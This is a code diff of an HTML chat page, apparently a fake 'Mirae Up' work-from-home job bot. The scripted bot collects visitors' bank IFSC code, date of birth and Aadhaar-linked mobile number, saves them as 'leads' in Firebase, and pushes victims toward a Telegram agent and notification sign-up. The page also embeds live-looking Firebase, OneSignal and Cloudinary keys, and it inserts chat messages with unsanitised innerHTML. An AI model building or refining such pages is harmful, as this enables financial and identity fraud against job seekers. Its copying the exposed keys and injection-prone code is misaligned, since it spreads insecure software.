@@ -22,12 +22,12 @@
         .sent { background:#dcf8c6; align-self: flex-end; border-top-right-radius:0; }
         .time { font-size: 10px; color: #888; align-self: flex-end; margin-top: 4px; }
         .msg img, .msg video { max-width: 100%; border-radius: 8px; margin-top: 5px; }
-        #callUI { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(7, 94, 84, 0.98); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; color:white; }
-        .call-btn-circle { width:70px; height:70px; border-radius:50%; border:none; color:white; font-size:24px; cursor:pointer; display:flex; align-items:center; justify-content:center; }
+
         .input-wrapper { background:#f0f0f0; padding:8px 10px; display:flex; align-items:center; gap:8px; min-height: 65px; border-top:1px solid #ddd; padding-bottom: calc(10px + env(safe-area-inset-bottom)); }
         .input-container { flex:1; background: white; border-radius: 25px; display: flex; align-items: center; padding: 2px 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
-        .input-container input { flex:1; border:none; outline:none; padding:10px 5px; font-size:16px; background: transparent; width: 100%; }
+        .input-container input { flex:1; border:none; outline:none; padding:10px 5px; font-size:16px; background: transparent; }
         button#sendBtn { background:#075e54; color:white; border:none; width:48px; height:48px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; flex-shrink: 0; }
+        
         .btn-row { display:none; gap:10px; justify-content:center; padding:15px; background:rgba(255,255,255,0.9); flex-wrap: wrap; border-top: 1px solid #ddd; }
         .opt-btn { background:#075e54; color:white; border:none; padding:10px 20px; border-radius:25px; cursor:pointer; font-weight:bold; }
         .action-card { background: white; padding: 12px; border-radius: 12px; margin-bottom: 12px; align-self: center; width: 90%; text-align: center; border: 1px solid #ddd; }
@@ -36,17 +36,11 @@
 </head>
 <body>
 <audio id="waSound" src="https://assets.mixkit.co/active_storage/sfx/2357/2357-preview.mp3" preload="auto"></audio>
-<audio id="waRing" src="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3" loop preload="auto"></audio>
-<div id="callUI">
-    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100" style="border-radius:50%; border:3px solid white; margin-bottom:20px;">
-    <h2 id="callStatus">Support Calling...</h2>
-    <div style="display:flex; margin-top:50px; gap:30px;"><button id="ansBtn" class="call-btn-circle" style="background:#25d366;">📞</button><button onclick="hangUpLocal()" class="call-btn-circle" style="background:#ff3b30;">📵</button></div>
-</div>
 <div class="container">
     <div class="header"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png"><div><div style="font-weight:bold; font-size: 16px;">Mirae Up Support</div><div id="status" style="font-size:12px; color:#cfd8dc;">Online</div></div></div>
     <div class="chat-box" id="chatBox"></div>
     <div id="buttonArea" class="btn-row"></div>
-    <div class="input-wrapper">
+    <div class="input-wrapper" id="inputWrapper">
         <div class="input-container">
             <label for="fileInp" style="cursor:pointer; font-size:22px; margin-right:10px">📎</label>
             <input type="file" id="fileInp" style="display:none" onchange="uploadToCloud(this)">
@@ -55,18 +49,29 @@
         <button id="sendBtn"><svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2,21L23,12L2,3V10L17,12L2,14V21Z" /></svg></button>
     </div>
 </div>
-<script>
-const firebaseConfig = { apiKey: "AIzaSyDw439IXSmTpustCkIQpRQ7foZ-hc8XiDQ", authDomain: "workhatapp.firebaseapp.com", databaseURL: "https://workhatapp-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "workhatapp", storageBucket: "workhatapp.appspot.com", messagingSenderId: "971559169599", appId: "1:971559169599:web:082be923ea9782440e128a" };
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database(), messaging = firebase.messaging(), AGORA_ID = "c0d5847270c04ed6b0bb4295ab2390b9", userId = localStorage.getItem('chat_uid') || 'USR' + Math.floor(Math.random()*999999);
-localStorage.setItem('chat_uid', userId);
 
-// --- OneSignal Integration ---
+<script>
+const firebaseConfig = {
+    apiKey: "AIzaSyDw439IXSmTpustCkIQpRQ7foZ-hc8XiDQ",
+    authDomain: "workhatapp.firebaseapp.com",
+    databaseURL: "https://workhatapp-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "workhatapp",
+    storageBucket: "workhatapp.appspot.com",
+    messagingSenderId: "971559169599",
+    appId: "1:971559169599:web:082be923ea9782440e128a"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// --- OneSignal Setup ---
 window.OneSignalDeferred = window.OneSignalDeferred || [];
 OneSignalDeferred.push(async function(OneSignal) {
     await OneSignal.init({ appId: "c029d484-4048-4dfd-b88f-b6080f1cbb84" });
-    OneSignal.login(userId); // Register user for offline push
+    OneSignal.setExternalUserId(localStorage.getItem('chat_uid'));
 });
+
+let userId = localStorage.getItem('chat_uid') || 'USR' + Math.floor(Math.random()*999999);
+localStorage.setItem('chat_uid', userId);
 
 const botSteps = [
     { key: "welcome", type: "auto", msg: "Welcome 🤗 To Ang Mirae Up Work From Home" },
@@ -78,25 +83,27 @@ const botSteps = [
     { key: "ifsc", type: "input", msg: "Enter Your Bank IFSC Code" },
     { key: "dob", type: "date", msg: "Select Your Date of Birth" },
     { key: "gender", type: "button", msg: "Select Your Gender", options: ["Male", "Female"] },
-    { key: "mobile", type: "input", msg: "Enter Your Mobile Number (10 digits)", pattern: /^[6-9][0-9]{9}$/ },
+    { key: "mobile", type: "input", msg: "Enter Your Aadhar Linked Mobile Number", pattern: /^[6-9][0-9]{9}$/ },
     { key: "state", type: "input", msg: "Enter Your State" },
     { key: "telegram", type: "button", msg: "Do You Have Telegram App?", options: ["Yes", "No"] }
 ];
 
-let currentIdx = 0, isBotActive = true, agoraClient, localTrack;
-const chatBox = document.getElementById('chatBox'), userInput = document.getElementById('userInput'), buttonArea = document.getElementById('buttonArea'), statusText = document.getElementById('status');
+let currentIdx = 0, isBotActive = true;
+const chatBox = document.getElementById('chatBox'), userInput = document.getElementById('userInput'), buttonArea = document.getElementById('buttonArea'), statusText = document.getElementById('status'), waSound = document.getElementById('waSound');
 
 function getTime() { const d = new Date(); return d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0'); }
 
-function appendMsg(m, type, isHtml = true) {
-    const d = document.createElement('div'); d.className = `msg ${type}`;
-    if(m.type==='image') d.innerHTML=`<img src="${m.message}">`;
-    else if(m.type==='video') d.innerHTML=`<video controls><source src="${m.message}"></video>`;
-    else {
-        let content = m.message;
-        // Auto-link detection for manual chat
-        if(!isHtml && content.includes("http")) {
-            content = content.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" style="color:#0088cc;font-weight:bold;">Click Here</a>');
+function appendMsg(m, type, isBotStep = false) {
+    const d = document.createElement('div');
+    d.className = `msg ${type}`;
+    let content = m.message;
+    // Media detection
+    if(content.includes("cloudinary.com")) {
+        if(content.match(/\.(mp4|webm)$/i)) d.innerHTML = `<video controls><source src="${content}"></video>`;
+        else d.innerHTML = `<img src="${content}">`;
+    } else {
+        if(!isBotStep && content.includes("http")) {
+            content = content.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" style="color:#0088cc;font-weight:bold;">Click to Open</a>');
         }
         d.innerHTML = content;
     }
@@ -115,13 +122,12 @@ window.onload = async () => {
     const leadSnap = await db.ref('leads/' + userId).once('value');
     const userData = leadSnap.val() || {};
 
-    if(userData.telegram) { 
-        isBotActive = false; 
-        if(!chatBox.innerHTML.includes("Form Submitted")) showFinal(userData.telegram === 'Yes');
-    } else {
+    if(userData.telegram) { isBotActive = false; }
+    else {
         let count = 0;
         for(let s of botSteps) { if(s.key && userData[s.key]) count++; else if(s.type!=="auto") break; }
-        currentIdx = (count > 0) ? count + 2 : 0; runBot();
+        currentIdx = (count > 0) ? count + 2 : 0;
+        runBot();
     }
 
     db.ref('chats/' + userId).on('child_added', snap => {
@@ -129,13 +135,10 @@ window.onload = async () => {
         if(m.sender === "Admin") {
             let last = chatBox.lastElementChild;
             if(!last || !last.innerHTML.includes(m.message)) {
-                appendMsg(m, "received"); document.getElementById('waSound').play().catch(()=>{});
+                appendMsg(m, "received"); waSound.play().catch(()=>{});
             }
         }
     });
-    
-    // Track Notif Permission
-    Notification.requestPermission().then(p => db.ref('leads/'+userId).update({notif_status: p}));
 };
 
 function runBot() {
@@ -143,8 +146,10 @@ function runBot() {
     const step = botSteps[currentIdx];
     statusText.innerText = "typing...";
     setTimeout(() => {
-        appendMsg({message: step.msg}, "received"); statusText.innerText = "Online";
-        if(step.type === "auto") { currentIdx++; runBot(); } else setupUI(step);
+        appendMsg({message: step.msg}, "received", true);
+        statusText.innerText = "Online";
+        if(step.type === "auto") { currentIdx++; runBot(); }
+        else setupUI(step);
     }, 600);
 }
 
@@ -154,8 +159,9 @@ function setupUI(step) {
     if(step.type === "button") {
         buttonArea.innerHTML = "";
         step.options.forEach(opt => {
-            const btn = document.createElement('button'); btn.className="opt-btn"; btn.innerText=opt;
-            btn.onclick = () => handleInput(opt); buttonArea.appendChild(btn);
+            const btn = document.createElement('button'); btn.className = "opt-btn"; btn.innerText = opt;
+            btn.onclick = () => { buttonArea.style.display = "none"; handleInput(opt); };
+            buttonArea.appendChild(btn);
         });
     }
     if(step.type === "date") userInput.onchange = () => { if(userInput.value) handleInput(userInput.value); };
@@ -163,35 +169,29 @@ function setupUI(step) {
 
 async function handleInput(val) {
     const step = botSteps[currentIdx];
-    if(step && step.pattern && !step.pattern.test(val.toUpperCase())) return appendMsg({message: "❌ Invalid format!"}, "received");
+    if(step && step.pattern && !step.pattern.test(val.toUpperCase())) return appendMsg({message: "❌ Invalid Format!"}, "received", true);
+    
     appendMsg({message: val}, "sent");
     userInput.value = "";
     if(step && step.key) {
         await db.ref('leads/' + userId).update({ [step.key]: val, uid: userId });
-        await db.ref('chats/' + userId).push({ sender: "User", message: val });
-        if(step.key === "telegram") { 
-            isBotActive = false; 
-            showFinal(val === 'Yes'); 
-            return; 
+        await db.ref('chats/' + userId).push({ sender: "User", message: val, time: getTime() });
+        if(step.key === "telegram") {
+            isBotActive = false;
+            appendMsg({message: "Form Submitted! Chat With My Agent For Joining."}, "received", true);
+            if(val === "Yes") appendMsg({message: `<a href="https://t.me/workfortyping" target="_blank" class="action-btn" style="background:#0088cc">CLICK TO CHAT ON TELEGRAM</a>`}, "received", true);
+            appendMsg({message: `<button onclick="OneSignal.showNativePrompt()" class="action-btn" style="background:#e91e63">ALLOW NOTIFICATIONS & INSTALL</button>`}, "received", true);
         }
     }
-    currentIdx++; runBot();
-}
-
-function showFinal(isTg) {
-    appendMsg({message: "Form Submitted! Chat With My Agent For Joining."}, "received");
-    const card = document.createElement('div');
-    card.className = "action-card";
-    card.innerHTML = (isTg ? `<a href="https://t.me/workfortyping" target="_blank" class="action-btn" style="background:#0088cc">CLICK TO CHAT ON TELEGRAM</a>` : "") + 
-                     `<button onclick="OneSignal.showNativePrompt()" class="action-btn" style="background:#e91e63">ALLOW OFFLINE UPDATES</button>`;
-    chatBox.appendChild(card);
+    currentIdx++;
+    runBot();
 }
 
 document.getElementById('sendBtn').onclick = () => {
     const v = userInput.value.trim();
     if(!v) return;
     if(isBotActive && currentIdx < botSteps.length && botSteps[currentIdx].type === "input") handleInput(v);
-    else { appendMsg({message:v}, "sent", false); db.ref('chats/' + userId).push({ sender: "User", message: v }); }
+    else { appendMsg({message:v}, "sent"); db.ref('chats/' + userId).push({ sender: "User", message: v }); }
     userInput.value = "";
 };
 
@@ -199,23 +199,12 @@ async function uploadToCloud(input) {
     const file = input.files[0]; if(!file) return;
     appendMsg({message: "⏳ Uploading Media..."}, "sent");
     const formData = new FormData();
-    formData.append('file', file); formData.append('upload_preset', 'mirae_preset');
+    formData.append('file', file);
+    formData.append('upload_preset', 'mirae_preset');
     const res = await fetch(`https://api.cloudinary.com/v1_1/dqw0atvkp/upload`, {method:'POST', body:formData});
     const data = await res.json();
-    await db.ref('chats/' + userId).push({ sender: "User", message: data.secure_url, type: (file.type.startsWith('video') ? 'video' : 'image') });
+    await db.ref('chats/' + userId).push({ sender: "User", message: data.secure_url });
 }
-
-document.getElementById('ansBtn').onclick = async () => {
-    document.getElementById('waRing').pause();
-    agoraClient = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
-    await agoraClient.join(AGORA_ID, "mirae_" + userId, null);
-    localTrack = await AgoraRTC.createMicrophoneAudioTrack({ AEC: true, ANS: true });
-    await agoraClient.publish([localTrack]);
-    agoraClient.on("user-published", async (u, mt) => { await agoraClient.subscribe(u, mt); if (mt === "audio") u.audioTrack.play(); });
-};
-
-function hangUpLocal() { db.ref('chats/' + userId).push({ sender: "User", type: "endcall", message: "Ended" }); document.getElementById('callUI').style.display='none'; }
-window.addEventListener('appinstalled', () => db.ref('leads/' + userId).update({ installed: "Yes" }));
 </script>
 </body>
 </html>
